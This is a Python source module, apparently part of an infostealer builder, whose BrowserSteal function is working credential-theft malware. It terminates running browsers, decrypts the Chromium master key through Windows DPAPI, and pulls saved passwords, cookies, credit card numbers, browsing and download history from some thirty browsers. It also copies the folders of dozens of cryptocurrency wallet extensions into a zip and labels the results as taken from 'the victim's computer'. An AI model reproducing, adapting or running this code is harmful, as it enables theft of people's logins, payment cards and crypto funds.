import os, json, base64, sqlite3, psutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData

def BrowserSteal(zip_file):
    global number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards

    browser_choice = ["%BROWSER_CHOICE%", "extentions", "passwords", "cookies", "history", "downloads", "cards"]
    browsers = []

    if "extentions" in browser_choice:
        number_extentions = 0
    else:
        number_extentions = None

    if "passwords" in browser_choice:
        file_passwords = []
        number_passwords = 0
    else:
        file_passwords = ""
        number_passwords = None
    if "cookies" in browser_choice:
        file_cookies = []
        number_cookies = 0
    else:
        file_cookies = ""
        number_cookies = None
    if "history" in browser_choice:
        file_history = []
        number_history = 0
    else:
        file_history = ""
        number_history = None
    if "downloads" in browser_choice:
        file_downloads = []
        number_downloads = 0
    else:
        file_downloads = ""
        number_downloads = None
    if "cards" in browser_choice:
        file_cards = []
        number_cards = 0
    else:
        file_cards = ""
        number_cards = None
    
    def GetMasterKey(path):
        if not os.path.exists(path):
            return None

        try:
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except:
            return None

    def Decrypt(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:-16]
            tag = buff[-16:]
            cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
            decryptor = cipher.decryptor()
            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
            return decrypted_pass.decode()
        except:
            return None
        
    def GetPasswords(browser, profile_path, master_key):
        global number_passwords
        password_db = os.path.join(profile_path, 'Login Data')
        if not os.path.exists(password_db):
            return

        conn = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(password_db)
        disk_conn.backup(conn)
        disk_conn.close()
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            url =          f"- Url      : {row[0]}"
            username =     f"  Username : {row[1]}"
            password =     f"  Password : {Decrypt(row[2], master_key)}"
            browser_name = f"  Browser  : {browser}"
            file_passwords.append(f"{url}\n{username}\n{password}\n{browser_name}\n")
            number_passwords += 1

        conn.close()

    def GetCookies(browser, profile_path, master_key):
        global number_cookies
        cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            return

        conn = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(cookie_db)
        disk_conn.backup(conn)
        disk_conn.close()
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue
            url =          f"- Url     : {row[0]}"
            name =         f"  Name    : {row[1]}"
            path =         f"  Path    : {row[2]}"
            cookie =       f"  Cookie  : {Decrypt(row[3], master_key)}"
            expire =       f"  Expire  : {row[4]}"
            browser_name = f"  Browser : {browser}"
            file_cookies.append(f"{url}\n{name}\n{path}\n{cookie}\n{expire}\n{browser_name}\n")
            number_cookies += 1

        conn.close()

    def GetHistory(browser, profile_path):
        global number_history
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return
        
        conn = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(history_db)
        disk_conn.backup(conn)
        disk_conn.close()
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            url =          f"- Url     : {row[0]}"
            title =        f"  Title   : {row[1]}"
            time =         f"  Time    : {row[2]}"
            browser_name = f"  Browser : {browser}"
            file_history.append(f"{url}\n{title}\n{time}\n{browser_name}\n")
            number_history += 1

        conn.close()
    
    def GetDownloads(browser, profile_path):
        global number_downloads
        downloads_db = os.path.join(profile_path, 'History')
        if not os.path.exists(downloads_db):
            return

        conn = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(downloads_db)
        disk_conn.backup(conn)
        disk_conn.close()
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            path =         f"- Path    : {row[1]}"
            url =          f"  Url     : {row[0]}"
            browser_name = f"  Browser : {browser}"
            file_downloads.append(f"{path}\n{url}\n{browser_name}\n")
            number_downloads += 1

        conn.close()
    
    def GetCards(browser, profile_path, master_key):
        global number_cards
        cards_db = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(cards_db):
            return

        conn = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(cards_db)
        disk_conn.backup(conn)
        disk_conn.close()
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue
            name =             f"- Name             : {row[0]}"
            expiration_month = f"  Expiration Month : {row[1]}"
            expiration_year =  f"  Expiration Year  : {row[2]}"
            card_number =      f"  Card Number      : {Decrypt(row[3], master_key)}"
            date_modified =    f"  Date Modified    : {row[4]}"
            browser_name =     f"  Browser          : {browser}"
            file_cards.append(f"{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n{browser_name}\n")
            number_cards += 1
        
        conn.close()

    def GetExtentions(zip_file, extensions_names, browser, profile_path):
        global number_extentions
        extensions_path = os.path.join(profile_path, 'Extensions')
        zip_folder = os.path.join("Extensions", browser)

        if not os.path.exists(extensions_path):
            return 

        extentions = [item for item in os.listdir(extensions_path) if os.path.isdir(os.path.join(extensions_path, item))]
        
        for extention in extentions:
            if "Temp" in extention:
                continue
            
            number_extentions += 1
            extension_found = False
            
            for extension_name, extension_folder in extensions_names:
                if extention == extension_folder:
                    extension_found = True
                    
                    extension_folder_path = os.path.join(zip_folder, extension_name, extention)
                    
                    source_extension_path = os.path.join(extensions_path, extention)
                    for item in os.listdir(source_extension_path):
                        item_path = os.path.join(source_extension_path, item)
                        
                        if os.path.isdir(item_path):
                            for dirpath, dirnames, filenames in os.walk(item_path):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, source_extension_path)
                                    zip_file.write(file_path, os.path.join(extension_folder_path, arcname))
                        else:
                            zip_file.write(item_path, os.path.join(extension_folder_path, item))
                    break

            if not extension_found:
                other_folder_path = os.path.join(zip_folder, "Unknown Extension", extention)
                
                source_extension_path = os.path.join(extensions_path, extention)
                for item in os.listdir(source_extension_path):
                    item_path = os.path.join(source_extension_path, item)
                    
                    if os.path.isdir(item_path):
                        for dirpath, dirnames, filenames in os.walk(item_path):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, source_extension_path)
                                zip_file.write(file_path, os.path.join(other_folder_path, arcname))
                    else:
                        zip_file.write(item_path, os.path.join(other_folder_path, item))
    
    # Get AppData paths for the current user
    path_appdata_local = os.getenv("LOCALAPPDATA")   # C:\Users\<User>\AppData\Local
    path_appdata_roaming = os.getenv("APPDATA")      # C:\Users\<User>\AppData\Roaming

    browser_files = [
        ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(path_appdata_local,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(path_appdata_local,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(path_appdata_local,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(path_appdata_local,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(path_appdata_local,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(path_appdata_local,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(path_appdata_local,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(path_appdata_local,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(path_appdata_local,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(path_appdata_local,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(path_appdata_local,   "Kometa", "User Data"),                           "kometa.exe"),
        ("Orbitum",                os.path.join(path_appdata_local,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(path_appdata_local,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(path_appdata_local,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(path_appdata_local,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(path_appdata_local,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(path_appdata_local,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(path_appdata_local,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(path_appdata_local,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(path_appdata_roaming, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    profiles = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    extensions_names = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for name, path, proc_name in browser_files:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.name().lower() == proc_name.lower():
                        proc.terminate()
                except:
                    pass
    except:
        pass

    for name, path, proc_name in browser_files:
        if not os.path.exists(path):
            continue

        master_key = GetMasterKey(os.path.join(path, 'Local State'))
        if not master_key:
            continue

        for profile in profiles:
            profile_path = os.path.join(path, profile)
            if not os.path.exists(profile_path):
                continue

        for profile in profiles:
            profile_path = os.path.join(path, profile)
            if not os.path.exists(profile_path):
                continue
            
            if "extentions" in browser_choice:
                try:
                    GetExtentions(zip_file, extensions_names, name, profile_path)
                except:
                    pass

            if "passwords" in browser_choice:
                try:
                    GetPasswords(name, profile_path, master_key)
                except:
                    pass

            if "cookies" in browser_choice:
                try:
                    GetCookies(name, profile_path, master_key)
                except:
                    pass

            if "history" in browser_choice:
                try:
                    GetHistory(name, profile_path)
                except:
                    pass

            if "downloads" in browser_choice:
                try:
                    GetDownloads(name, profile_path)
                except:
                    pass

            if "cards" in browser_choice:
                try:
                    GetCards(name, profile_path, master_key)
                except:
                    pass

            if name not in browsers:
                browsers.append(name)

    if "passwords" in browser_choice:
        if not file_passwords:
            file_passwords.append("No passwords was saved on the victim's computer.")
        file_passwords = "\n".join(file_passwords)

    if "cookies" in browser_choice:
        if not file_cookies:
            file_cookies.append("No cookies was saved on the victim's computer.")
        file_cookies   = "\n".join(file_cookies)

    if "history" in browser_choice:
        if not file_history:
            file_history.append("No history was saved on the victim's computer.")
        file_history   = "\n".join(file_history)

    if "downloads" in browser_choice:
        if not file_downloads:
            file_downloads.append("No downloads was saved on the victim's computer.")
        file_downloads = "\n".join(file_downloads)

    if "cards" in browser_choice:
        if not file_cards:
            file_cards.append("No cards was saved on the victim's computer.")
        file_cards     = "\n".join(file_cards)
    
    if number_passwords != None:
        zip_file.writestr(f"Passwords ({number_passwords}).txt", file_passwords)

    if number_cookies != None:
        zip_file.writestr(f"Cookies ({number_cookies}).txt", file_cookies)

    if number_cards != None:
        zip_file.writestr(f"Cards ({number_cards}).txt", file_cards)

    if number_history != None:
        zip_file.writestr(f"Browsing History ({number_history}).txt", file_history)

    if number_downloads != None:
        zip_file.writestr(f"Download History ({number_downloads}).txt",file_downloads)

    return number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards

